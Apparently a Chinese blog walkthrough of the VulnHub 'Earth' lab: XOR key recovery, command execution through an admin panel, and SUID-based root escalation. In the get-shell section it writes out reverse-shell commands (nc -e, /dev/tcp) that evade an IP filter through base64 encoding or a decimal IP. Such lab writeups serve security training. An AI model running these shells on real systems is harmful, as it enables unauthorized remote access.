<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="该靶机难度适中。">
<meta property="og:type" content="article">
<meta property="og:title" content="Earth Writeup">
<meta property="og:url" content="https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/index.html">
<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
<meta property="og:description" content="该靶机难度适中。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517203004.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517230957.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231103.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231347.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231430.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232220.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232301.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518211043.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232342.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232726.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233221.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518201819.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233354.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234027.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234407.png">
<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234433.png">
<meta property="article:published_time" content="2022-05-16T16:00:00.000Z">
<meta property="article:modified_time" content="2022-05-18T13:14:21.198Z">
<meta property="article:author" content="hdfzzf">
<meta property="article:tag" content="综合">
<meta property="article:tag" content="vulnhub">
<meta property="article:tag" content="suid提权">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="加解密">
<meta property="article:tag" content="反弹shell——base64绕过">
<meta property="article:tag" content="反弹shell——ip进制转换绕过">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517203004.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/LOGO.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Earth Writeup</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2022/05/18/Mercury%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2022/05/17/suid,%20ruid,%20euid%20%E5%8C%BA%E5%88%AB/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&text=Earth Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&title=Earth Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&is_video=false&description=Earth Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Earth Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&title=Earth Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&title=Earth Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&title=Earth Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&title=Earth Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&name=Earth Writeup&description=&lt;p&gt;该靶机难度适中。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/17/Earth%20Writeup/&t=Earth Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">3.1.</span> <span class="toc-text">3.1. 方法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">3.2.</span> <span class="toc-text">3.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Earth Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hdfzzf</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-05-16T16:00:00.000Z" itemprop="datePublished">2022-05-17</time>
        
        (Updated: <time datetime="2022-05-18T13:14:21.198Z" itemprop="dateModified">2022-05-18</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/suid%E6%8F%90%E6%9D%83/" rel="tag">suid提权</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/" rel="tag">加解密</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BC%B9shell%E2%80%94%E2%80%94base64%E7%BB%95%E8%BF%87/" rel="tag">反弹shell——base64绕过</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BC%B9shell%E2%80%94%E2%80%94ip%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87/" rel="tag">反弹shell——ip进制转换绕过</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-earth,755/">The Planets: Earth ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">sudo</span> arp-scan -l
<span class="token number">2</span>. <span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.50
<span class="token number">3</span>. <span class="token function">sudo</span> nmap -p22,80,443 -A <span class="token number">10.0</span>.2.50<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517203004.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>首先，根据扫描结果，先将两个域名<code>earth.local</code>和<code>terratest.earth.local</code>加入/etc/hosts。</p>
<p>依次访问了80端口和443端口（443端口需要在前面假设https），但是页面都是一样的。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517230957.png" /></p>
<p>并且存在三行 Previous Messages: <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// Previous Messages:

37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40

3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45

2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>暂时不知道有什么用，那就访问下一个域名</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231103.png" /></p>
<p>对两个域名都进行路径扫描，发现结果一样，得到一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231347.png" /></p>
<p>但是，terratest.earth.local有robots.txt，而另一个域名没有。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517231430.png" /></p>
<p>注意最后一个 testingnotes.* ，经过测试，发现后缀是 txt，访问得到下面的内容： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/testingnotes.txt

Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>从中得到以下信息：</p>
<ol type="1">
<li>加密方式是异或；</li>
<li>存在一个testdata.txt文件</li>
<li>登录界面的用户名为 terra</li>
</ol>
<p>访问testdata.txt文件 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/testdata.txt

According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<p>根据猜测，testdata.txt的内容经过某个message key异或之后，得到的就是previous messages中最长的一条（最后一条），可以测试的，将testdata.txt的内容复制到message，然后message key随便写，得到的长度和最后一条previous message一样。</p>
<p>那么公式就是： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">real_message = message ^ message key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>我们已经知道了real_message和message，现在可以得到message key。我直接放入cyberchef中</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232220.png" /></p>
<p>整理后如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimatechangebad4humans
earthclimat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>利用 earthclimatechangebad4humans 成功登录后台</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232301.png" /></p>
<p>这里其实可以使用下面命令查看是哪个文件进行了过滤。 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> / -name <span class="token string">"*.py"</span> -type f <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"Remote connections are forbidden"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518211043.png" /></p>
<p>然后查看该文件的内容： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> /var/earth_web/secure_message/forms.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re <span class="token keyword">from</span> ipaddress 
<span class="token keyword">import</span> ip_address <span class="token keyword">from</span> django 
<span class="token keyword">import</span> forms <span class="token keyword">from</span> django<span class="token punctuation">.</span>forms 
<span class="token keyword">import</span> ModelForm <span class="token keyword">from</span> django<span class="token punctuation">.</span>core<span class="token punctuation">.</span>exceptions 
<span class="token keyword">import</span> ValidationError <span class="token keyword">from</span> <span class="token punctuation">.</span>models 
<span class="token keyword">import</span> EncryptedMessage 
<span class="token keyword">class</span> <span class="token class-name">MessageForm</span><span class="token punctuation">(</span>ModelForm<span class="token punctuation">)</span><span class="token punctuation">:</span> 
	message_key <span class="token operator">=</span> forms<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span> 
	
<span class="token keyword">class</span> <span class="token class-name">Meta</span><span class="token punctuation">:</span> 
	model <span class="token operator">=</span> EncryptedMessage fields <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span> 
	
<span class="token keyword">class</span> <span class="token class-name">CLICommandField</span><span class="token punctuation">(</span>forms<span class="token punctuation">.</span>CharField<span class="token punctuation">)</span><span class="token punctuation">:</span> 
	<span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span> 
		<span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>validate<span class="token punctuation">(</span>value<span class="token punctuation">)</span> 
		<span class="token keyword">for</span> potential_ip <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span> 
			<span class="token keyword">try</span><span class="token punctuation">:</span> 
				ip_address<span class="token punctuation">(</span>potential_ip<span class="token punctuation">)</span> 
			<span class="token keyword">except</span><span class="token punctuation">:</span> 
				<span class="token keyword">pass</span> 
			<span class="token keyword">else</span><span class="token punctuation">:</span> 
				<span class="token keyword">raise</span> ValidationError<span class="token punctuation">(</span><span class="token string">'Remote connections are forbidden.'</span><span class="token punctuation">)</span> 
				
<span class="token keyword">class</span> <span class="token class-name">CLIForm</span><span class="token punctuation">(</span>forms<span class="token punctuation">.</span>Form<span class="token punctuation">)</span><span class="token punctuation">:</span> 
	cli_command <span class="token operator">=</span> CLICommandField<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'CLI command'</span><span class="token punctuation">,</span> max_length<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从该文件中也可以看到就是过滤了ip的格式。</p>
<h1 id="get-shell">3. get shell</h1>
<h2 id="方法1">3.1. 方法1</h2>
<p>这里能够执行系统命令，因此直接使用下面的命令反弹shell: <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -e /bin/bash <span class="token number">10.0</span>.2.4 <span class="token number">3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>但是好像经过了一定的过滤</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232342.png" /></p>
<p>我又尝试了往网页的目录写反弹shell的文件，也失败了。最后思考，应该是过滤了ip地址，导致无法执行反弹shell的命令，因此先将上面的命令base64编码 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>m1ku㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token builtin class-name">echo</span> <span class="token string">"nc -e /bin/bash 10.0.2.4 3333"</span> <span class="token operator">|</span> base64 
bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDMzMzMK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<p>然后执行如下命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi40IDMzMzMK"</span> <span class="token operator">|</span> base64 -d<span class="token operator">|</span> /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517232726.png" /></p>
<h2 id="方法2">3.2. 方法2</h2>
<p>因为只过滤了ip，因此将ip换成其他进制表示，反弹shell的命令如下： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/167772676/3333 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233221.png" /></p>
<blockquote>
<p>其实也可以使用nc，nc中的变量也支持其他进制显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220518201819.png" /></p>
</blockquote>
<h1 id="权限提升">4. 权限提升</h1>
<p>获得shell之后经过所有的信息收集，发现不存在内核漏洞，sudo没密码，没有可疑进程，suid只有一个比较可疑的二进制文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517233354.png" /></p>
<p>直接执行该文件 <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>利用 <code>strings /usr/bin/reset_root</code> 命令查看，会发现这么一句话： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">/usr/bin/echo <span class="token string">'root:Earth'</span> <span class="token operator">|</span> /usr/sbin/chpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>猜测，如果这个文件执行成功，就会修改root的密码。但是根据错误提示，还是缺少了 triggers。</p>
<p>将该文件利用nc传到kali，然后运行下面的命令： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ltrace ./reset_root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234027.png" /></p>
<p>这是c语言的代码。二进制文件执行到这就退出了，并且三句 access 函数的结果都是 -1，猜测这就是 triggers，而<code>access(filename, 0)</code>的0表示是否存在这个文件，如果存在access返回0，否则返回-1</p>
<p>思路：在靶机上创建这三个文件： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">touch</span> /dev/shm/kHgTFI5G
<span class="token number">2</span>. <span class="token function">touch</span> /dev/shm/Zw7bV9U5
<span class="token number">3</span>. <span class="token function">touch</span> /tmp/kcM0Wewe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<p>然后再执行该文件就成功了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234407.png" /></p>
<p>最后切换为root即可</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220517234433.png" /></p>
<p>读取flag收尾</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/root/root_flag.txt

              _-o#&amp;&amp;*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&amp;#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&amp;&amp;HMMMMMMMMMM?.
    ,'              $M&amp;ood,~'`(&amp;##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &amp;              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#&#125;'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM&#125;       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &amp;MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &amp;M&#125;                     `          .-
      `&amp;.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当然，也可以将该文件逆向成c文件。</p>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度适中，就是最后权限提升的时候没想到ltrace这个命令。涉及的攻击方法有：</p>
<ol type="1">
<li>加解密</li>
<li>RCE</li>
<li>反弹shell——base64绕过</li>
<li>反弹shell——ip进制转换绕过</li>
<li>跟踪进程调用库情况</li>
</ol>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
